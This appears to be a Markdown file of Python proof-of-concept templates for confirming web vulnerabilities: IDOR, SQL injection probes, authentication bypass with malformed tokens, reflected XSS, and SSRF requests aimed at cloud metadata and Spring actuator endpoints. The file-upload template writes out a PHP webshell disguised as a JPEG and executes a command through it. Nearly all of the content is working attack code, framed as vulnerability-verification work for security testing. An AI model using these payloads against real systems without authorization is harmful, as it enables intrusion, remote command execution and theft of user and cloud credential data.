# PoC HTTP Requester Templates

Python `requests`-based proof-of-concept templates. Adapt to each finding.

## Base Setup

```python
import requests

BASE_URL = "http://TARGET:PORT"  # Target application base URL
s = requests.Session()
# Set auth headers if needed
# s.headers.update({"Authorization": "Bearer TOKEN"})
# s.cookies.set("session", "COOKIE_VALUE")
```

## IDOR — Insecure Direct Object Reference

```python
# Setup: Two accounts with different privilege levels
user_a_token = "TOKEN_A"  # Victim user
user_b_token = "TOKEN_B"  # Attacker user
target_resource = "/api/users/1/profile"  # Resource owned by user A

# Step 1: Confirm user A can access their own resource
resp_a = s.get(f"{BASE_URL}{target_resource}", headers={"Authorization": f"Bearer {user_a_token}"})
assert resp_a.status_code == 200, "User A should access own resource"

# Step 2: Attempt access as user B (attacker)
resp_b = s.get(f"{BASE_URL}{target_resource}", headers={"Authorization": f"Bearer {user_b_token}"})
# VULNERABLE if: status 200 and body contains user A's data
# PATCHED if: status 403 or 404
print(f"Status: {resp_b.status_code}")
print(f"Body: {resp_b.text[:500]}")
```

## SQL Injection

```python
# Baseline: normal request
resp_normal = s.get(f"{BASE_URL}/api/items", params={"id": "1"})

# SQLi probe: always-true condition
resp_inject = s.get(f"{BASE_URL}/api/items", params={"id": "1 OR 1=1"})
# VULNERABLE if: resp_inject returns more data than resp_normal or different structure

# Boolean-based detection
resp_true = s.get(f"{BASE_URL}/api/items", params={"id": "1 AND 1=1"})
resp_false = s.get(f"{BASE_URL}/api/items", params={"id": "1 AND 1=2"})
# VULNERABLE if: resp_true matches resp_normal AND resp_false differs
print(f"Normal rows: {len(resp_normal.json())}")
print(f"Injected rows: {len(resp_inject.json())}")
print(f"True cond matches normal: {resp_true.text == resp_normal.text}")
print(f"False cond differs: {resp_false.text != resp_normal.text}")
```

## Authentication Bypass

```python
# Direct access without credentials
resp_no_auth = s.get(f"{BASE_URL}/admin/dashboard")
# VULNERABLE if: status 200 with admin content
# PATCHED if: status 401 or redirect to login
print(f"No-auth status: {resp_no_auth.status_code}")

# Token manipulation: empty/null/malformed tokens
for token in ["", "null", "undefined", "admin", "Bearer ", "Bearer null"]:
    resp = s.get(f"{BASE_URL}/api/protected", headers={"Authorization": token})
    print(f"Token '{token}': {resp.status_code} — {resp.text[:100]}")
```

## XSS — Cross-Site Scripting (Reflected)

```python
# Payload that's identifiable in response without executing
xss_payload = '<img src=x onerror=alert(1)>'
xss_marker = 'onerror=alert(1)'  # Search for this in response

# Inject via query parameter
resp = s.get(f"{BASE_URL}/search", params={"q": xss_payload})
# VULNERABLE if: payload appears unencoded in response body
reflected = xss_marker in resp.text
encoded = '&lt;img' in resp.text or '&lt;' in resp.text
print(f"Payload reflected raw: {reflected}")
print(f"Payload was encoded: {encoded}")
if reflected and not encoded:
    print("VULNERABLE: XSS payload reflected without encoding")
```

## File Upload — Unrestricted Type

```python
import io

# Malicious file: PHP webshell disguised as image
malicious_content = b'<?php system($_GET["cmd"]); ?>'
files = {"file": ("shell.php.jpg", io.BytesIO(malicious_content), "image/jpeg")}

resp_upload = s.post(f"{BASE_URL}/api/upload", files=files)
print(f"Upload status: {resp_upload.status_code}")
print(f"Upload response: {resp_upload.text[:300]}")

# If upload returns a URL, attempt to execute
if resp_upload.status_code == 200:
    upload_path = resp_upload.json().get("path", "")
    resp_exec = s.get(f"{BASE_URL}{upload_path}", params={"cmd": "id"})
    # VULNERABLE if: response contains uid= output
    print(f"Execution attempt: {resp_exec.text[:200]}")
```

## SSRF — Server-Side Request Forgery

```python
# Internal URL targets
internal_urls = [
    "http://127.0.0.1:80/",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://localhost:8080/actuator/env",          # Spring Boot internals
]

# Baseline: external URL
resp_external = s.post(f"{BASE_URL}/api/fetch-url", json={"url": "https://httpbin.org/get"})
print(f"External fetch: {resp_external.status_code}")

# SSRF probes
for url in internal_urls:
    resp = s.post(f"{BASE_URL}/api/fetch-url", json={"url": url})
    # VULNERABLE if: status 200 with internal service response data
    # PATCHED if: status 400/403 or filtered error message
    print(f"SSRF [{url}]: {resp.status_code} — {resp.text[:200]}")
```
